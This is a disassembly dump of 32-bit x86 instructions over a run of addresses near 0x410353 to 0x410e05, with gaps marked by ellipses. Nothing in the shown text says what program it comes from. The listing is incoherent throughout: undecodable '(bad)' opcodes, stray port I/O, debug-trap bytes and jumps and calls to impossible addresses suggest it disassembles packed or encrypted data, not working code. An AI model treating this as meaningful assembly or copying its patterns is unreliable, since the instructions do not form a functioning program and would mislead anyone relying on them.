  410353:	jae    0x41037c
  410355:	fs ins BYTE PTR es:[edi],dx
  410357:	add    BYTE PTR [esi],bh
  410359:	in     eax,0x98
  41035b:	addr16 inc eax
  41035d:	push   edx
  41035e:	inc    ebp
  41035f:	add    BYTE PTR [esi-0x29f7b01b],cl
  410365:	mov    ecx,0xebe1fea4
  41036a:	mov    ch,0x78
  41036c:	frndint 
  41036e:	fnstenv [edx+edx*8+0x4]
  410372:	push   eax
  410373:	or     dh,dl
  410375:	xor    eax,0x5ac1ff53
  41037a:	xor    ch,al
  41037c:	cmp    eax,0xa58eb45b
  410381:	fldcw  WORD PTR [edi+edx*8]
  410384:	adc    esp,DWORD PTR [esi]
  410386:	ret    
  410387:	add    edx,DWORD PTR [ecx+esi*1]
  41038a:	inc    esi
  41038b:	push   eax
  41038c:	inc    esi
  41038d:	jae    0x4103df
  41038f:	push   ecx
  410390:	xchg   ecx,eax
  410391:	jge    0x4103f2
  410393:	inc    eax
  410394:	mov    dh,al
  410396:	call   0x26408786
  41039b:	fiadd  DWORD PTR [ebx+ebx*4-0x6c]
  41039f:	cld    
	...
  4103c8:	add    BYTE PTR [eax],al
  4103ca:	add    ebx,esi
  4103cc:	call   0x80fd5cd4
  4103d1:	neg    bh
  4103d3:	sbb    ebp,ecx
  4103d5:	xor    ebx,DWORD PTR [ecx+0x7]
  4103d8:	icebp  
  4103d9:	jmp    0x4103ac
  4103db:	mov    eax,0xd361d9f5
  4103e0:	outs   dx,DWORD PTR ds:[esi]
  4103e1:	fiadd  DWORD PTR [eax-0x2f]
  4103e4:	sbb    ebp,DWORD PTR [edx]
  4103e6:	xchg   BYTE PTR [edx],bl
  4103e8:	jmp    0x218a7679
  4103ed:	inc    ebx
  4103ee:	fisttp DWORD PTR ds:0x5116aa04
  4103f5:	and    al,0x9c
  4103f7:	sbb    ch,cl
  4103f9:	xor    BYTE PTR [esi],ah
  4103fb:	jnp    0x410448
  4103fd:	add    al,0x3e
  4103ff:	push   eax
  410400:	test   eax,0x91252150
  410405:	bsr    edi,DWORD PTR [ebp+ebx*4+0x34]
  41040a:	pop    bx
  41040c:	jmp    0xfa34aff9
  410411:	gs jg  0x41046f
  410414:	sbb    ecx,ebx
  410416:	push   edx
  410417:	push   ebx
  410418:	xchg   ecx,eax
  410419:	inc    ebx
  41041a:	pushf  
  41041b:	jl     0x41041c
  41041d:	jne    0x4103f9
  41041f:	adc    bh,BYTE PTR [ecx+0x6e]
  410422:	out    0x71,eax
  410424:	add    BYTE PTR [edi-0x2bffc143],ch
  41042a:	xchg   ebx,eax
  41042b:	push   ss
  41042c:	cld    
  41042d:	sbb    al,BYTE PTR [eax]
	...
  410457:	add    BYTE PTR [edx-0x78b1013d],al
  41045d:	jge    0x410450
  41045f:	xchg   edi,eax
  410460:	cmp    dl,BYTE PTR [ebp+esi*2-0x7e]
  410464:	ja     0x41046d
  410466:	cld    
  410467:	ss stc 
  410469:	push   edx
  41046a:	call   0xfebcf0f6
  41046f:	(bad)  
  410470:	aaa    
  410471:	xchg   edx,eax
  410472:	shl    ebp,0x3d
  410475:	mov    eax,DWORD PTR es:0xb7fb98c3
  41047c:	cs icebp 
  41047e:	call   DWORD PTR [edx-0xe8b83d6]
  410484:	gs push ss
  410486:	jbe    0x41047e
  410488:	rol    WORD PTR [ebp+ebp*8-0x4e],cl
  41048d:	inc    edi
  41048e:	xor    DWORD PTR cs:[ebp+0x5b],edi
  410492:	mov    ebx,DWORD PTR [eax+ecx*2]
  410495:	adc    eax,DWORD PTR [ecx-0x17]
  410498:	mov    ebp,0x6155003c
  41049d:	repz xor cl,BYTE PTR [ebx+0x7d]
  4104a1:	pop    ebx
  4104a2:	push   edi
  4104a3:	rcr    DWORD PTR [edx+0x3ae8fff6],1
  4104a9:	fwait
  4104aa:	jae    0x41047a
  4104ac:	dec    edi
  4104ad:	jae    0x410465
  4104af:	imul   edx,DWORD PTR [esi],0x7d
  4104b2:	dec    edi
  4104b3:	adc    DWORD PTR [edx],edi
  4104b5:	pop    ebx
  4104b6:	out    dx,eax
  4104b7:	push   edi
  4104b8:	push   ebp
  4104b9:	bound  ebp,QWORD PTR ss:[eax]
	...
  4104e4:	add    BYTE PTR [eax],al
  4104e6:	cmp    ch,BYTE PTR [ebx]
  4104e8:	inc    DWORD PTR [eax]
  4104ea:	fimul  DWORD PTR [edi-0x18]
  4104ed:	ret    
  4104ee:	xchg   BYTE PTR [ebx+0x1fa3e8fd],ah
  4104f4:	(bad)  
  4104f5:	(bad)  
  4104f6:	mov    esp,0x61804658
  4104fb:	push   edi
  4104fc:	jne    0x4104f8
  4104fe:	fldenv [ebx-0x5d313fcf]
  410504:	std    
  410505:	push   eax
  410507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410508:	lods   al,BYTE PTR ds:[esi]
  410509:	cmp    BYTE PTR [eax-0x350044f4],ch
  41050f:	mov    ds:0x6f9f75fd,eax
  410514:	es jbe 0x410567
  410517:	mov    ds:0x962e5e5d,eax
  41051c:	add    al,BYTE PTR [eax]
  41051e:	stos   BYTE PTR es:[edi],al
  41051f:	into   
  410520:	jmp    0xbd00:0x68a41b83
  410527:	xor    edi,edi
  410529:	jne    0x41057a
  41052b:	outs   dx,DWORD PTR ds:[esi]
  41052c:	enter  0x5075,0xa3
  410530:	xchg   DWORD PTR [ebp+0x53],eax
  410533:	out    dx,al
  410534:	jmp    FWORD PTR [ecx+0x57]
  410537:	out    dx,eax
  410538:	inc    edx
  410539:	bound  esp,QWORD PTR [esi+0x5f]
  41053c:	push   0x805f2700
  410541:	call   0x401bf1
  410546:	sbb    al,0x9f
  410548:	jb     0x410569
	...
  410572:	add    BYTE PTR [eax],al
  410574:	aaa    
  410575:	xchg   DWORD PTR [edx-0x7e],eax
  410578:	rcl    BYTE PTR [edx+0x5f17684e],1
  41057e:	out    dx,eax
  41057f:	mov    esi,0x4162557f
  410584:	out    0x2e,eax
  410586:	push   DWORD PTR [ebp-0x11]
  410589:	xchg   BYTE PTR [esi-0x5f],cl
  41058c:	ds rcl esi,1
  41058f:	out    0x87,eax
  410591:	dec    esp
  410592:	xlat   BYTE PTR ds:[ebx]
  410593:	(bad)  
  410594:	fnstenv [edi-0x2a]
  410597:	dec    BYTE PTR [ebx+0x6c]
  41059a:	jmp    0xfcc8:0xd6f153cb
  4105a1:	add    BYTE PTR [edx],0x55
  4105a4:	lds    edx,FWORD PTR [eax]
  4105a6:	add    ebx,0xffffffb2
  4105a9:	mov    es,WORD PTR [edx]
  4105ab:	push   0x5b
  4105ad:	adc    DWORD PTR [ecx+0x8],edx
  4105b0:	xchg   esi,eax
  4105b1:	xchg   esp,eax
  4105b2:	dec    edi
  4105b3:	call   FWORD PTR [ecx+0x26fc40eb]
  4105b9:	test   BYTE PTR [edx],al
  4105bb:	out    dx,eax
  4105bc:	enter  0x559c,0x62
  4105c0:	inc    DWORD PTR [ebx-0x3d237496]
  4105c6:	add    bh,bh
  4105c8:	jmp    0x410635
  4105ca:	jmp    0xebfe:0xd7519f5a
  4105d1:	xlat   BYTE PTR ds:[bx]
  4105d3:	je     0x41061b
  4105d5:	dec    esp
  4105d6:	jne    0x41064c
	...
  410600:	add    BYTE PTR [eax],al
  410602:	push   ecx
  410603:	jns    0x4105d0
  410605:	rol    DWORD PTR [edx-0x7c],0x2f
  410609:	mov    edx,DWORD PTR [edx+0x5]
  41060c:	sar    bl,0xa4
  41060f:	test   BYTE PTR [eax+0x2e],ch
  410612:	xor    DWORD PTR [edi],ecx
  410614:	or     al,0xe8
  410616:	jae    0x41062f
  410618:	xlat   BYTE PTR ds:[ebx]
  410619:	(bad)  
  41061a:	mov    bh,0x3e
  41061c:	fsub   DWORD PTR [edi+0x3e]
  41061f:	test   ch,ah
  410621:	mov    ebp,0x416112a6
  410626:	ds sbb al,0xab
  410629:	popa   
  41062a:	jg     0x4105b0
  41062c:	aad    0x74
  41062e:	inc    esi
  41062f:	pop    ebx
  410630:	xchg   ecx,eax
  410631:	and    ebx,DWORD PTR [edi+0x3e6b9d79]
  410637:	pop    ebx
  410638:	xchg   BYTE PTR [ebp+0x450abc59],dl
  41063e:	add    edx,DWORD PTR ds:[edx+0x61]
  410642:	jg     0x41069f
  410644:	jle    0x410696
  410646:	ss sbb edi,0xffffffa4
  41064a:	sar    BYTE PTR [ecx+0x6d],0x50
  41064e:	mov    edx,0xa60bdb79
  410653:	cmp    esp,edx
  410655:	(bad)  
  410656:	test   al,0xa3
  410658:	sub    bh,bh
  41065a:	mov    eax,ds:0xbce7620e
  41065f:	sahf   
  410660:	inc    esp
  410661:	mov    ch,dl
  410663:	dec    edx
  410664:	jb     0x410657
	...
  41068e:	add    BYTE PTR [eax],al
  410690:	pop    ss
  410691:	pop    ebx
  410692:	fs inc eax
  410694:	or     BYTE PTR [edx],0x2e
  410697:	push   eax
  410698:	inc    esi
  410699:	add    eax,0x4aead6e9
  41069e:	push   ds
  41069f:	xor    DWORD PTR [edx-0x20],ecx
  4106a2:	sub    BYTE PTR [eax+0x19],dl
  4106a5:	out    0xb3,al
  4106a7:	xlat   BYTE PTR ds:[ebx]
  4106a8:	leave  
  4106a9:	add    al,0xe9
  4106ab:	imul   edi,DWORD PTR [esi],0x3e01fe03
  4106b1:	pop    ebx
  4106b2:	test   BYTE PTR [edi+0x32],0x5
  4106b6:	out    dx,al
  4106b7:	aad    0xaf
  4106b9:	pop    edi
  4106ba:	push   ebx
  4106bb:	add    al,0xa4
  4106bd:	pop    ebx
  4106be:	sar    DWORD PTR [ebp+0x73e95b9f],1
  4106c4:	and    bh,ch
  4106c6:	int3   
  4106c7:	in     al,dx
  4106c8:	fwait
  4106c9:	cld    
  4106ca:	call   0xecdf0dd2
  4106cf:	add    esi,DWORD PTR [ebx-0x1c]
  4106d2:	inc    esp
  4106d4:	mov    edi,0x2962fb9c
  4106d9:	dec    edi
  4106da:	mov    edi,ebx
  4106dc:	addr16 pop ebx
  4106de:	lea    esp,[esi+eax*1]
  4106e1:	sub    edi,edi
  4106e3:	sbb    al,0x36
  4106e5:	js     0x41075b
  4106e7:	loope  0x410750
  4106e9:	pop    ebx
  4106ea:	(bad)  
  4106eb:	cld    
  4106ec:	loope  0x410767
  4106ee:	push   ecx
  4106ef:	ror    DWORD PTR [eax-0x48],1
  4106f2:	je     0x4106c2
	...
  41071c:	add    BYTE PTR [eax],al
  41071e:	mov    dh,0xf
  410720:	cld    
  410721:	pop    ecx
  410722:	and    al,0x5b
  410724:	push   0xffffffe9
  410726:	and    eax,0x3de90278
  41072b:	js     0x4107a1
  41072d:	stc    
  41072e:	pop    ss
  41072f:	js     0x41072f
  410731:	fistp  DWORD PTR [ecx+0x3dd30002]
  410737:	cmp    DWORD PTR [eax-0x35],0x3d
  41073b:	pop    ebx
  41073c:	nop
  41073d:	ss icebp 
  41073f:	jbe    0x410728
  410741:	stc    
  410742:	ficomp WORD PTR [edx+0x0]
  410745:	xor    BYTE PTR [eax+ebp*2+0x0],bh
  410749:	mov    ah,0xb6
  41074b:	test   BYTE PTR [edx-0x7cee3dd3],al
  410751:	mov    WORD PTR [ebp+0x78],ss
  410754:	jae    0x410742
  410756:	or     ah,BYTE PTR [edx-0x1bc22a3f]
  41075c:	push   esp
  41075d:	fnsave [esi-0x2a5b72b6]
  410763:	daa    
  410764:	push   0xffffffe9
  410766:	or     ch,bh
  410768:	or     ebx,esi
  41076a:	js     0x4107cf
  41076c:	push   0xffffffe9
  41076e:	or     ch,bh
  410770:	adc    ecx,esi
  410772:	dec    edi
  410773:	jne    0x5269ee79
  410779:	(bad)  
  41077a:	(bad)  {k7}{z}
  41077f:	pop    esp
  410780:	mov    edx,DWORD PTR [ebp+0x0]
	...
  4107ab:	add    BYTE PTR [edi-0x1d],ch
  4107ae:	adc    BYTE PTR [ebp-0x72b12cde],cl
  4107b4:	and    bl,BYTE PTR [edi-0x711895b2]
  4107ba:	jae    0x410774
  4107bc:	enter  0xc29,0x83
  4107c0:	cmp    dl,bl
  4107c2:	(bad)  
  4107c3:	jae    0x4107c7
  4107c5:	loope  0x410842
  4107c7:	ror    BYTE PTR [eax+0x29],0x14
  4107cb:	push   DWORD PTR [edx+0x1837fd6b]
  4107d1:	sub    DWORD PTR [edi+edi*8],ecx
  4107d4:	xchg   edx,eax
  4107d5:	arpl   di,di
  4107d7:	push   ebp
  4107d8:	scas   eax,DWORD PTR es:[edi]
  4107d9:	mov    ?,WORD PTR ds:0xfffa67e8
  4107df:	jmp    DWORD PTR [edi+esi*4]
  4107e2:	add    bh,bh
  4107e4:	fcmove st,st(7)
  4107e6:	jae    0x4107c8
  4107e8:	cld    
  4107e9:	aam    0x89
  4107eb:	push   ebp
  4107ec:	out    dx,eax
  4107ed:	loop   0x4107ff
  4107ef:	call   edx
  4107f1:	sar    ebp,cl
  4107f3:	push   edx
  4107f4:	outs   dx,DWORD PTR ds:[esi]
  4107f5:	cs leave 
  4107f7:	ret    0x5b63
  4107fa:	push   ebp
  4107fb:	mov    ebx,DWORD PTR [ebx-0x27]
  4107fe:	ret    0x39f8
  410801:	(bad)  
  410802:	std    
  410803:	push   edi
  410804:	int3   
  410805:	dec    eax
  410806:	adc    BYTE PTR [ebx-0x77c1f9b],cl
  41080c:	sub    DWORD PTR [ebx+0x50fd],ecx
	...
  41083a:	lea    ebx,[edi-0x1]
  41083d:	jne    0x41086e
  41083f:	sbb    DWORD PTR [eax],eax
  410841:	(bad)  
  410842:	ds pop ss
  410844:	hlt    
  410845:	(bad)  
  410846:	ins    BYTE PTR es:[edi],dx
  410847:	push   0xa8bbf89
  41084c:	retf   
  41084d:	test   BYTE PTR [edx],cl
  41084f:	mov    bh,0xd2
  410851:	(bad)  
  410852:	test   BYTE PTR ds:[edx],al
  410855:	add    ch,al
  410857:	bswap  esp
  410859:	std    
  41085a:	icebp  
  41085b:	mov    ebp,0xffbb117e
  410860:	iret   
  410861:	std    
  410862:	loope  0x410831
  410864:	xor    ecx,DWORD PTR [ebp-0x12e7b3d]
  41086a:	rcl    DWORD PTR [esi+ebx*2+0x10],1
  41086e:	leave  
  41086f:	das    
  410870:	int3   
  410871:	std    
  410872:	shr    ebp,0xd2
  410875:	push   ecx
  410876:	dec    edx
  410877:	add    DWORD PTR [ecx-0x2d024f05],edx
  41087d:	jmp    FWORD PTR ds:0x3ebc815f
  410883:	or     eax,0x8f99fed3
  410888:	idiv   dh
  41088a:	or     edx,DWORD PTR [ecx+edx*8-0x2e32c58c]
  410891:	je     0x4108c9
  410893:	sbb    al,0xb
  410895:	(bad)  
  410896:	jns    0x4108dd
  410898:	xchg   esi,eax
  41089a:	dec    esi
  41089b:	cmp    eax,0xfb81
	...
  4108c8:	push   0x5d74d355
  4108cd:	pop    ecx
  4108ce:	stos   DWORD PTR es:[edi],eax
  4108cf:	mov    dh,BYTE PTR [ebx+0x51fed24c]
  4108d5:	jmp    0x5cd507cf
  4108da:	sar    dh,cl
  4108dc:	inc    ecx
  4108dd:	ins    DWORD PTR es:[edi],dx
  4108de:	xor    al,0x8
  4108e0:	cdq    
  4108e1:	cmp    eax,esi
  4108e3:	(bad)  
  4108e5:	pop    ebx
  4108e6:	cmp    al,0x7f
  4108e8:	adc    eax,0x23cba4dc
  4108ed:	jbe    0x4108c4
  4108ef:	cmp    al,ch
  4108f1:	paddusw mm7,QWORD PTR [esi+0x2f]
  4108f5:	call   0x764cd465
  4108fa:	mov    ebp,0x435b9433
  4108ff:	add    al,0xf9
  410901:	out    dx,eax
  410902:	(bad)  
  410904:	(bad)  
  410905:	xor    ebp,DWORD PTR [ebx+eax*8+0x72]
  410909:	stc    
  41090a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41090b:	dec    eax
  41090c:	loop   0x410968
  41090e:	jmp    0x620c4716
  410913:	js     0x4108de
  410915:	je     0x41089c
  410917:	shl    BYTE PTR [eax+ecx*2+0xac2486c],cl
  41091e:	mov    BYTE PTR fs:[ebp+0x1d26d74],dh
  410925:	add    ecx,edi
  410927:	shl    dl,cl
  410929:	jb     0x410989
  41092b:	rol    BYTE PTR [eax],cl
	...
  410955:	add    BYTE PTR [eax-0x3600458b],ah
  41095b:	fxch   st(3)
  41095d:	iret   
  41095e:	xchg   ecx,eax
  41095f:	in     eax,0xbc
  410961:	es mov ebx,0x80d13cb7
  410967:	jne    0x4109c1
  410969:	shl    dl,cl
  41096b:	dec    edx
  41096c:	cs pop eax
  41096e:	inc    edx
  41096f:	jbe    0x41090c
  410971:	sti    
  410972:	adc    BYTE PTR [ebx+0x7560d2ea],al
  410978:	imul   ecx,edx,0x400dcb49
  41097e:	push   edx
  41097f:	retf   0xe97b
  410982:	mov    ecx,0xaa7e4d81
  410987:	jb     0x410988
  410989:	test   BYTE PTR [edi],0x76
  41098c:	mov    bl,bl
  41098e:	or     al,0xb0
  410990:	mul    edi
  410992:	pcmpeqd mm7,mm6
  410995:	cmp    esp,DWORD PTR [edx]
  410997:	push   ss
  410998:	leave  
  410999:	stos   DWORD PTR es:[edi],eax
  41099a:	ds pop ebx
  41099c:	push   ebp
  41099d:	bound  ebx,QWORD PTR [esi]
  41099f:	jbe    0x410a15
  4109a1:	icebp  
  4109a2:	out    dx,al
  4109a3:	out    dx,eax
  4109a4:	pop    ss
  4109a5:	rcr    DWORD PTR [edx-0x17],1
  4109a8:	(bad)  
  4109a9:	mov    dh,0xf
  4109ab:	lock or eax,ecx
  4109ae:	push   ecx
  4109af:	cli    
  4109b0:	(bad)  
  4109b1:	call   0xa9c39e62
  4109b6:	cmp    BYTE PTR [ebx],cl
  4109b8:	call   FWORD PTR [eax+eax*1]
	...
  4109e3:	add    BYTE PTR [esi],bh
  4109e5:	je     0x410a5b
  4109e7:	icebp  
  4109e8:	cmc    
  4109e9:	aaa    
  4109ea:	jb     0x410972
  4109ec:	out    dx,eax
  4109ed:	jne    0x410a63
  4109ef:	aad    0xee
  4109f1:	out    dx,eax
  4109f2:	pcmpeqd mm2,QWORD PTR [ecx]
  4109f5:	push   ebx
  4109f6:	call   0xfeb515b9
  4109fb:	xor    BYTE PTR [eax+0x22b40048],al
  410a01:	cmp    dh,0xdc
  410a04:	xchg   ebp,eax
  410a05:	jne    0x410a7b
  410a07:	icebp  
  410a08:	jne    0x410a87
  410a0a:	jo     0x410a52
  410a0c:	outs   dx,DWORD PTR ds:[esi]
  410a0d:	jne    0x410a83
  410a0f:	in     eax,dx
  410a10:	gs pop eax
  410a12:	pusha  
  410a13:	jmp    0x2e912555
  410a18:	or     DWORD PTR [edi-0x1],esp
  410a1b:	pushf  
  410a1c:	push   ebp
  410a1d:	jl     0x410a26
  410a1f:	fwait
  410a20:	mov    ?,WORD PTR [ebp-0x2]
  410a23:	pushf  
  410a24:	push   ecx
  410a25:	jne    0x410a9b
  410a27:	stc    
  410a28:	outs   dx,BYTE PTR ds:[esi]
  410a29:	out    dx,eax
  410a2a:	pop    ss
  410a2b:	add    BYTE PTR [edi],ch
  410a2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a2e:	outs   dx,DWORD PTR ds:[esi]
  410a2f:	inc    DWORD PTR [eax-0x4f]
  410a32:	rcl    BYTE PTR [edi+eiz*1],0x2d
  410a36:	mov    ebp,esp
  410a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a39:	mov    ds:0x8b20f7d2,eax
  410a3e:	std    
  410a3f:	jne    0x410a80
  410a41:	hlt    
  410a42:	add    DWORD PTR [eax],0xfffffff3
  410a45:	mov    bh,ch
  410a47:	push   eax
	...
  410a70:	add    BYTE PTR [eax],al
  410a72:	add    BYTE PTR ds:0xa508e808,cl
  410a78:	std    
  410a79:	jmp    FWORD PTR [ebp+0x5f]
  410a7c:	push   0x0
  410a7e:	jg     0x410a0a
  410a80:	add    DWORD PTR [eax],eax
  410a82:	out    0xf4,eax
  410a84:	add    DWORD PTR [eax],0xffffff9f
  410a87:	mov    bh,ch
  410a89:	push   eax
  410a8a:	dec    ebp
  410a8b:	mov    bh,ch
  410a8d:	jne    0x410a66
  410a8f:	adc    eax,0x8fe76a00
  410a94:	sbb    al,0x60
  410a96:	xlat   BYTE PTR ds:[ebx]
  410a97:	push   edi
  410a98:	mov    DWORD PTR [ebp-0x26cb9],0x5797
  410aa2:	fcomp  st(4)
  410aa4:	repnz mul DWORD PTR [eax]
  410aa7:	mov    eax,DWORD PTR [eax]
  410aa9:	add    BYTE PTR [edi-0x107a38a9],dl
  410aaf:	xchg   edx,eax
  410ab0:	std    
  410ab1:	jmp    DWORD PTR [edi+0x58000057]
  410ab7:	(bad)  
  410ab9:	test   DWORD PTR [eax-0x75],0x5767fffe
  410ac0:	mov    edx,DWORD PTR [ebp-0x71]
  410ac3:	not    BYTE PTR [eax]
  410ac5:	push   0x57
  410ac7:	hlt    
  410ac8:	xor    eax,0x48
  410acb:	mov    edi,ebp
  410acd:	push   eax
  410ace:	inc    DWORD PTR ds:[ebp-0x2f9bb615]
  410ad5:	dec    edi
	...
  410afe:	add    BYTE PTR [eax],al
  410b00:	mov    ebx,0x41f6db06
  410b05:	je     0x410b38
  410b07:	push   DWORD PTR [ebx+0x4274cf94]
  410b0d:	adc    DWORD PTR [eax+ecx*1-0x6c],0x4674cd84
  410b15:	xchg   ecx,eax
  410b16:	xor    DWORD PTR [ebp+edi*4-0x39],eax
  410b1a:	fcomi  st,st(6)
  410b1c:	adc    DWORD PTR [edx+0x78c20f03],esp
  410b22:	add    eax,DWORD PTR [eax]
  410b24:	ds add eax,0xa9f1eb91
  410b2a:	into   
  410b2b:	inc    DWORD PTR [eax-0x8]
  410b2e:	inc    BYTE PTR [eax]
  410b30:	ds test ch,al
  410b33:	test   BYTE PTR [edx],cl
  410b35:	retf   0xfece
  410b38:	ds test ch,bl
  410b3b:	mov    ebp,0x41620e66
  410b40:	ds out 0x88,eax
  410b43:	inc    ebp
  410b45:	icebp  
  410b46:	into   
  410b47:	dec    edi
  410b48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b49:	shr    BYTE PTR [esi],0x0
  410b4c:	ds test ebx,0x8940fc73
  410b53:	shr    DWORD PTR [ecx+0x3e00cf11],cl
  410b59:	sbb    DWORD PTR [esi+0x43a68267],ecx
  410b5f:	add    BYTE PTR [ebx+0xfc03ff],bh
	...
  410b8d:	add    BYTE PTR [ecx-0x5c17cbcf],al
  410b93:	leave  
  410b94:	add    al,BYTE PTR [eax]
  410b96:	mov    ebx,0x81235844
  410b9b:	pop    ebx
  410b9c:	ins    BYTE PTR es:[edi],dx
  410b9d:	mov    eax,0x21d7268
  410ba2:	adc    BYTE PTR ds:[esi+0x5c],0x5a
  410ba7:	std    
  410ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba9:	add    edi,DWORD PTR [ebx+0x40cfe8d8]
  410baf:	jb     0x410b49
  410bb1:	fcmovnb st,st(3)
  410bb3:	adc    ecx,ebp
  410bb5:	add    edi,DWORD PTR [ebx-0x23772266]
  410bbb:	pop    edx
  410bbc:	jmp    0x4ab4a1c4
  410bc1:	inc    ebp
  410bc2:	ds loopne 0x410c30
  410bc5:	add    edx,DWORD PTR [esi]
  410bc7:	jb     0x410b96
  410bc9:	xor    edx,DWORD PTR [esi]
  410bcb:	add    al,0x49
  410bcd:	add    al,0x3e
  410bcf:	test   ax,0x6f57
  410bd3:	fdivrp st(3),st
  410bd5:	xchg   DWORD PTR [esp+ebx*1-0x28c6fc17],eax
  410bdc:	add    edi,DWORD PTR ds:0x9e5b
  410be1:	cwde   
  410be2:	loope  0x410c4d
  410be4:	xchg   ebp,eax
  410be5:	into   
  410be6:	rcl    bh,0x88
  410be9:	(bad)  
  410bea:	enter  0x8571,0x98
  410bee:	aad    0x69
  410bf0:	jge    0x410bc0
	...
  410c1a:	add    BYTE PTR [eax],al
  410c1c:	enter  0x8cd7,0xd6
  410c20:	mov    al,0x71
  410c22:	pop    ebx
  410c23:	mov    BYTE PTR [ecx-0xe319a97],dl
  410c29:	add    al,0xe8
  410c2b:	pop    ecx
  410c2c:	ds add eax,0x53e59e9
  410c32:	jmp    0x3dbbceb7
  410c37:	into   
  410c38:	or     BYTE PTR [edx],0x3e
  410c3b:	clc    
  410c3c:	mov    ebp,0x3da80025
  410c41:	data16 shl BYTE PTR [ebp-0x28b8e00],0x70
  410c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c4a:	xlat   BYTE PTR ds:[ebx]
  410c4b:	push   ss
  410c4c:	mov    BYTE PTR [eax-0x2],dh
  410c4f:	pop    esp
  410c50:	mov    eax,ds:0x780efe68
  410c55:	out    0xf,al
  410c57:	push   es
  410c58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c59:	(bad)  
  410c5a:	idiv   dh
  410c5c:	or     edi,DWORD PTR [ecx+0xf]
  410c5f:	test   DWORD PTR [ebx],0xd934fe72
  410c65:	imul   edi,esi,0x5e0302e6
  410c6b:	jmp    0xd65d90ad
  410c70:	imul   eax,DWORD PTR [edi-0x1],0xfe69ea94
  410c77:	(bad)  
  410c78:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c7a:	jmp    0x410c32
  410c7c:	or     esi,DWORD PTR [edx-0x2]
  410c7f:	cmp    al,0x0
	...
  410ca9:	add    dl,ch
  410cab:	jno    0x410c61
  410cad:	xchg   ebp,eax
  410cae:	adc    esi,DWORD PTR [edx-0x2]
  410cb1:	xchg   ecx,eax
  410cb2:	fsubr  DWORD PTR [edi-0x2]
  410cb5:	sahf   
  410cb6:	or     ebp,DWORD PTR [eax+0x72039eeb]
  410cbc:	out    0x9,eax
  410cbe:	sbb    ebx,DWORD PTR [ebx+0x0]
  410cc1:	mov    al,0xfc
  410cc3:	dec    esp
  410cc4:	add    BYTE PTR [edi+esi*1],dl
  410cc7:	test   BYTE PTR [edx-0xf93553],al
  410ccd:	hlt    
  410cce:	test   eax,0x3dc60a78
  410cd3:	pop    ebx
  410cd4:	or     ebp,DWORD PTR [ecx]
  410cd6:	icebp  
  410cd7:	push   ebp
  410cd8:	pop    esi
  410cd9:	and    BYTE PTR [esp+eiz*2+0x0],bh
  410cdd:	cmp    BYTE PTR [edx-0x6aff4023],ah
  410ce3:	repz into 
  410ce5:	lea    esp,[edx+0x28524e90]
  410ceb:	or     BYTE PTR [eax+ebp*8],cl
  410cee:	dec    esi
  410cef:	lock std 
  410cf1:	dec    DWORD PTR [ebp+esi*4-0x6decb279]
  410cf8:	or     BYTE PTR [esi],dh
  410cfa:	pop    eax
  410cfb:	mov    BYTE PTR [edx+0x29],0x4b
  410cff:	pop    ebp
  410d00:	inc    ebp
  410d01:	aam    0x96
  410d03:	fcomi  st,st(7)
  410d05:	adc    al,0xb5
  410d07:	lea    ebp,[ecx]
  410d09:	neg    BYTE PTR [esi+0xebd008]
	...
  410d37:	add    bh,bh
  410d39:	inc    ebp
  410d3a:	movzx  edx,BYTE PTR [ebx+0x51]
  410d3e:	in     al,dx
  410d3f:	push   eax
  410d40:	outs   dx,DWORD PTR ds:[esi]
  410d41:	push   ebx
  410d42:	arpl   WORD PTR [ecx+0x27],ax
  410d45:	icebp  
  410d46:	inc    ebx
  410d47:	fadd   DWORD PTR [edi-0x71]
  410d4a:	push   cs
  410d4b:	pop    edi
  410d4c:	pop    ss
  410d4d:	pop    esp
  410d4e:	add    esp,0xffffffeb
  410d51:	lock inc ebx
  410d53:	fcom   DWORD PTR [edi-0x62]
  410d56:	jae    0x410d28
  410d58:	inc    ecx
  410d5a:	je     0x410d5b
  410d5c:	cwde   
  410d5d:	hlt    
  410d5e:	inc    ebx
  410d5f:	shl    BYTE PTR [ecx],1
  410d61:	(bad)  
  410d63:	adc    al,0x35
  410d65:	stos   BYTE PTR es:[edi],al
  410d66:	jg     0x410dcd
  410d68:	xchg   ebx,eax
  410d69:	sahf   
  410d6a:	(bad)  
  410d6b:	call   edi
  410d6d:	sahf   
  410d6e:	jae    0x410d44
  410d70:	dec    edi
  410d71:	push   ebx
  410d72:	arpl   WORD PTR [ecx-0x59],ax
  410d75:	lock inc ebx
  410d77:	fadd   DWORD PTR [edi-0x71]
  410d7a:	ficomp WORD PTR [esi-0x69]
  410d7d:	pop    ebx
  410d7e:	add    esp,0xffffffab
  410d81:	lock inc ebx
  410d83:	fdivr  DWORD PTR [esi]
  410d85:	mov    dl,0xcb
  410d87:	je     0x410df7
  410d89:	sbb    DWORD PTR [ecx+0x7a188175],ebx
  410d8f:	inc    esp
  410d90:	mov    ?,esi
  410d92:	inc    ebp
  410d93:	int3   
  410d94:	push   cs
  410d95:	sub    DWORD PTR [esi-0x30],edx
  410d98:	(bad)  
  410d99:	push   0x5f
  410d9b:	inc    ecx
	...
  410dc4:	add    BYTE PTR [eax],al
  410dc6:	cmp    DWORD PTR ds:[esi],edx
  410dc9:	stos   BYTE PTR es:[edi],al
  410dca:	push   es
  410dcb:	ret    
  410dcc:	add    ch,al
  410dce:	mov    ecx,esi
  410dd0:	retf   
  410dd1:	(bad)  
  410dd2:	xor    eax,0xa983fc42
  410dd7:	add    DWORD PTR [edx],0xbab7c700
  410ddd:	xor    BYTE PTR [ebx-0x3df0fcc8],0x2
  410de4:	add    eax,DWORD PTR [eax]
  410de6:	ds jne 0x410e39
  410de9:	or     al,0x26
  410deb:	aaa    
  410dec:	sub    al,BYTE PTR [eax]
  410dee:	ds mov bl,0xe3
  410df1:	cmp    dh,0x82
  410df4:	jnp    0x410e3a
  410df6:	into   
  410df7:	xchg   ebp,eax
  410df8:	push   eax
  410df9:	or     al,0xc9
  410dfb:	aaa    
  410dfc:	nop
  410dfd:	(bad)  
  410dfe:	imul   edi,DWORD PTR [eax-0x4201bb86],0x50
  410e05:	enter  0x3fb1,0xc0
